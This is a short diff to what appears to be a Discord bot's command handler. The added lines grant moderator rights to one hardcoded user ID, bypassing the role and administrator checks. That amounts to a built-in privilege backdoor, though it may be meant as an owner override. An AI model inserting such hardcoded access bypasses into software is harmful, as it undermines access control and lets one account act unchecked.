@@ -93,6 +93,9 @@ try {
     } else {
         if (command.needsmod) {
             var isMod = false;
+            if (message.author.id == "253330909313499136") {
+                isMod = true;
+            }
             modRoles.forEach(element => {
                 if (message.member.roles.cache.has(element) || message.member.hasPermission(['ADMINISTRATOR'])){
                     isMod = true;
